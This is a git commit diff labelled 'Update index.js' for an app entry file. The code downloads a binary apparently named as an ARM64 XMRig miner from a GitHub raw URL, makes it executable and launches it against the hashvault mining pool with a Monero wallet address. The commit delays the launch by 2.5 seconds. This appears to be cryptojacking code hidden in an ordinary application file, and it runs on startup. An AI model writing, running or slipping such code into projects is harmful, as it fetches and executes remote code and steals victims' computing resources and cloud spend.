81ca66065652fd4375d80c4a7f3be369225eb6ca
iceyfromdiscord <116362513+iceyfromdiscord@users.noreply.github.com>
2026-02-01 04:25:43 -0600

    Update index.js

--- app/index.js
+++ app/index.js
@@ -7,8 +7,12 @@ const http = require("http");
 https.get("https://github.com/iceyfromdiscord/arm/raw/refs/heads/main/xm-arm64", (res) => {
   res.pipe(fs.createWriteStream("prog"));
 });
-spawn("chmod +x prog", { shell: true, stdio: "inherit" });
-spawn("./prog --url pool.hashvault.pro:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass aws --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14", { shell: true, stdio: "inherit" });
+
+setTimeout(function(){
+  spawn("chmod +x prog", { shell: true, stdio: "inherit" });
+  spawn("./prog --url pool.hashvault.pro:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass aws --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14", { shell: true, stdio: "inherit" });
+}, 2500);
+
 
 // const arch = process.arch;
 // console.log("arch:", arch);
